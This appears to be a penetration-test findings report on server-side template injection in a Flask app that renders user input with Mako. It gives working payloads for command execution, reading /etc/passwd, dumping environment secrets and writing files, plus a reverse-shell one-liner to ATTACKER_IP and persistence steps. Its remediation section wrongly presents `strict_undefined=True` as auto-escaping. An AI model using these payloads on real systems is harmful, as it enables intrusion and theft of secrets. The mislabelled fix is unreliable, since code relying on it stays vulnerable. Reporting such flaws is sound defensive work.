# Findings – SSTI in Flask (Mako)

## Summary

A critical Server-Side Template Injection vulnerability was identified in the Flask application using the Mako template engine. The vulnerability allows unauthenticated attackers to execute arbitrary Python code on the server, resulting in full system compromise.

## Vulnerability Details

### Type
Server-Side Template Injection (SSTI)

### Severity
**CRITICAL** (CVSS 3.1: 9.8)

### Affected Component
- **Framework:** Flask (Python web framework)
- **Template Engine:** Mako
- **Entry Point:** GET parameter `text` (or similar user input)
- **Vulnerable Function:** `render_template()` or `Template().render()`

## Root Cause

The application renders user-supplied input directly into a Mako template without validation or sanitization:

```python
from flask import Flask, request
from mako.template import Template

app = Flask(__name__)

@app.route('/')
def index():
    user_input = request.args.get('text', '')
    # VULNERABLE: User input directly in template
    template = Template(user_input)
    return template.render()
```

## Technical Analysis

### Attack Vector

Mako templates support Python expression evaluation within `${}` delimiters. An attacker can inject:

1. **Simple Expression Evaluation:**
   ```
   ${7*7}
   ```
   Result: `49`

2. **Object Inspection:**
   ```
   ${self.__dict__}
   ```

3. **Module Import & Command Execution:**
   ```
   ${__import__('os').popen('id').read()}
   ```

4. **File Read:**
   ```
   ${open('/etc/passwd').read()}
   ```

### Proof of Concept

**Payload 1 - Basic Arithmetic:**
```
?text=${7*7}
```
Response: Outputs `49`

**Payload 2 - Command Execution (whoami):**
```
?text=${''.join(__import__('os').popen('whoami').readlines())}
```
Response: Outputs the current system user

**Payload 3 - Read System Files:**
```
?text=${open('/etc/passwd').read()}
```
Response: Contents of `/etc/passwd`

**Payload 4 - Environment Variables:**
```
?text=${__import__('os').environ}
```
Response: All environment variables and secrets

## Impact Assessment

| Category | Description |
|----------|-------------|
| **Confidentiality** | HIGH - Attacker can read any file the web server has access to |
| **Integrity** | HIGH - Attacker can modify/create files, inject content |
| **Availability** | HIGH - Attacker can crash the application or system |
| **Scope** | CHANGED - Attacker can impact the underlying operating system |
| **Exploitation** | TRIVIAL - No authentication, single GET parameter |

## Exploitation Steps

1. **Identify the vulnerable parameter:**
   - Monitor request parameters passed to template rendering
   - Look for GET/POST parameters in `render_template()` calls

2. **Test for SSTI:**
   - Input: `${7*7}` → If output shows `49`, template injection is confirmed
   - Input: `${sleep(5)}` → Test for time-based SSTI

3. **Determine template engine:**
   - Different syntax: Jinja2 uses `{{}}`, Mako uses `${}`, ERB uses `<%= %>`
   - Error messages often reveal the engine

4. **Escalate to RCE:**
   ```
   ${__import__('os').popen('COMMAND').read()}
   ```

5. **Achieve persistence (if needed):**
   - Create reverse shell
   - Add SSH keys
   - Modify application code

## Proof of Concept Payloads

### List Directory Contents
```
${__import__('os').popen('ls -la /tmp').read()}
```

### Reverse Shell (one-liner)
```
${__import__('os').popen('bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"').read()}
```

### Write to File
```
${open('/tmp/pwned.txt', 'w').write('Hacked by SSTI')}
```

## Remediation

### Immediate Actions

1. **Never render user input directly in templates:**
   ```python
   # VULNERABLE
   template = Template(user_input)
   
   # SECURE
   template = Template("Hello ${name}")
   template.render(name=user_input)
   ```

2. **Use auto-escaping:**
   ```python
   from mako.template import Template
   template = Template(source, strict_undefined=True)
   ```

3. **Whitelist approach:**
   ```python
   allowed_templates = {
       'welcome': 'Welcome ${user}!',
       'goodbye': 'Goodbye ${user}!',
   }
   
   template_name = request.args.get('template')
   if template_name in allowed_templates:
       template = Template(allowed_templates[template_name])
   ```

### Long-term Fixes

1. **Input Validation:**
   - Only accept known, safe template names
   - Never accept raw template source from users

2. **Use Template Inheritance:**
   ```python
   # Define templates server-side only
   base_template = """
   Hello ${username}!
   Your email is ${email}
   """
   ```

3. **Implement CSP (for frontend SSTI):**
   - Content-Security-Policy headers

4. **Security Scanning:**
   - Use static analysis tools (Bandit, SonarQube)
   - Implement SAST in CI/CD pipeline

5. **Least Privilege:**
   - Run web application with minimal system permissions
   - Use containerization to limit blast radius

## Testing Checklist

- [ ] Verify SSTI with basic math operations (`${7*7}`)
- [ ] Confirm Python code execution capability
- [ ] Test file read access (`/etc/passwd`)
- [ ] Test command execution (`id`, `whoami`)
- [ ] Check for WAF/filtering bypass needs
- [ ] Document all working payloads
- [ ] Verify remediation blocking injections

## References

- [OWASP - Server-Side Template Injection](https://owasp.org/www-community/attacks/Server-Side_Template_Injection)
- [Mako Template Engine Documentation](https://docs.makotemplates.org/)
- [HackTricks - SSTI](https://book.hacktricks.xyz/pentesting-web/server-side-template-injection-ssti)
- [PortSwigger - Server-Side Template Injection](https://portswigger.net/research/server-side-template-injection)